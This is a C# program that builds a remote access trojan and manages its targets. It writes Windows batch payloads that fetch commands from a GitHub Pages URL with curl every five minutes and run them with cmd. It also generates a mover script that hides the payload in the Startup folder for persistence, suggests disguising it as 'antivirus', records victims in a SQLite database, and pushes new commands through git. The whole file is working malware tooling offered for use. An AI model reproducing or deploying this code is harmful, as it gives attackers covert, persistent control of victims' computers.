// See https://aka.ms/new-console-template for more information
using System.IO;
using System.Diagnostics;
using System.Threading;
using Microsoft.Data.Sqlite;

// CONFIG
string mover_file = "mover.bat";
string shell = "/bin/bash";
string github_repo_link = "https://samjoel2007.github.io/Strings/";  

void shell_exec(string command) {
	System.Diagnostics.Process.Start("/bin/bash", $"-c \"{command}\"");
}

void save_target(string target_name, string rat_file, string cmd_file) {
	var connection = new SqliteConnection("Data Source=rat.db");
	try {
		
		connection.Open();
	} catch {
		Console.WriteLine("\nError connecting with database\n");
	}
	
	
	// CREATES THE DAMN TARGETS TABLE IF TABLE DOESN'T EXIST 
	var query = connection.CreateCommand();
	
	
	        query.CommandText = "CREATE TABLE IF NOT EXISTS targets (id INTEGER PRIMARY KEY AUTOINCREMENT,target_name TEXT,rat_file TEXT,cmd_file TEXT)";
        query.ExecuteNonQuery();
        
        // TO INSERT THE DAMN TARGET RECORDS TO THE TARGETS TABLE 0_0
        var query1 = connection.CreateCommand();
        query1.CommandText = "INSERT INTO targets (target_name, rat_file, cmd_file) VALUES (@target_name, @rat_file, @cmd_file)";
query1.Parameters.AddWithValue("@target_name", target_name);
query1.Parameters.AddWithValue("@rat_file", rat_file);
query1.Parameters.AddWithValue("@cmd_file", cmd_file);
        query1.ExecuteNonQuery();
}

void view_targets() {
	var connection = new SqliteConnection("Data Source=rat.db");
        connection.Open();
        var select = connection.CreateCommand();
        select.CommandText = "SELECT * FROM targets";
        var reader = select.ExecuteReader();

        while(reader.Read())
        {
	    Console.WriteLine(reader["id"] + "    " + reader["target_name"] + "       " + reader["rat_file"] + "       " + reader["cmd_file"]); 
            Console.WriteLine("-------------------");
        }

        reader.Close();
        connection.Close();
}

void generate_rat(string target, string file, string command) {
	// CREATE A DIRECTORY FOR THE TARGET
	shell_exec($"mkdir {target}"); // CREATES DIR FOR THE TARGET
	Thread.Sleep(3);
	System.Diagnostics.Process.Start("/bin/bash", $"-c \"touch {target}/{file}.bat\""); // CREATES EMPTY BATCH FILE
	Thread.Sleep(3);
	System.Diagnostics.Process.Start("/bin/bash", $"-c \"touch {target}/{target}.txt\""); // CREATES EMPTY COMMAND TXT FILE
	Thread.Sleep(3);
	string file_path = target + "/" + file + ".bat";
	string command_file = target + "/" + target + ".txt"; // THE INITIAL CMD COMMAND IS STORED HERE
	File.AppendAllText(file_path, "@echo off\n");	
	File.AppendAllText(file_path, "setlocal enabledelayedexpansion\n");
	File.AppendAllText(file_path, ":loop\n");
	File.AppendAllText(file_path, $"curl -s \"{github_repo_link}{target}/{target}.txt\" > temp_cmd.txt\n");
	File.AppendAllText(file_path, "set /p command=<temp_cmd.txt\n");
	File.AppendAllText(file_path, "del temp_cmd.txt\n");
	File.AppendAllText(file_path, "cmd /c \"!command!\"\n");
	File.AppendAllText(file_path, "timeout /t 300 /nobreak >nul\n");
	File.AppendAllText(file_path, "goto loop\n");
	
	// SETS THE INITIAL COMMAND
	file_path = $"{target}/{target}.txt";
	File.AppendAllText(file_path, $"{command}");
}

void generate_mover(string file, string target) {
	string file_path = $"{target}/mover.bat";
	shell_exec($"touch {file_path}"); // CREATES EMPTY MOVER FILE
	Thread.Sleep(3);
	File.AppendAllText(file_path, "@echo off\n");
	File.AppendAllText(file_path, $"set \"source=%~dp0{file}.bat\"\n");
	File.AppendAllText(file_path, "set \"startup=%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\n");
	File.AppendAllText(file_path, "move \"%source%\" \"%startup%\\\"\n");
	File.AppendAllText(file_path, $"attrib +h \"%startup%\\{file}.bat\"\n");
	File.AppendAllText(file_path, "pause\n");
}

void push_changes() {
	shell_exec("git add .");
	shell_exec("git commit -m \"Program Commit\"");
	shell_exec("git push");
}

// MAIN

while (true) {
    Console.WriteLine("(1) Create new Target");
    Console.WriteLine("(2) View Targets");
    Console.WriteLine("(3) Command Center");
    Console.WriteLine("(0) Exit\n");
    Console.Write("Enter number: ");
    string opn = Console.ReadLine();

    if (opn == "1") {
        // TARGET DETAILS
    	Console.Write("\nEnter target's name: ");
	string target_name = Console.ReadLine();
	// NAME OF THE RAT FILE
	Console.Write("\nEnter RAT file name (eg: antivirus) : ");
	string file = Console.ReadLine();
	// INITIAL COMMAND TO BE EXECUTED ON THE RAT FILE
	Console.Write("\nEnter cmd command that should be executed on target machine: ");
	string cmd = Console.ReadLine();
	// GENERATES THE RAT FILE
	generate_rat(target_name, file, cmd);
	// GENERATES THE MOVER FILE
	generate_mover(file, target_name);
	// SAVES TARGETS INFO IN DB
	save_target(target_name, file, cmd); 
	// SAVES CHANGES AND SET THE TARGET
	push_changes();
	
    } else if (opn == "2") {
    	view_targets();

    } else if (opn == "3") {

    } else {
         return;
    } 
    
}
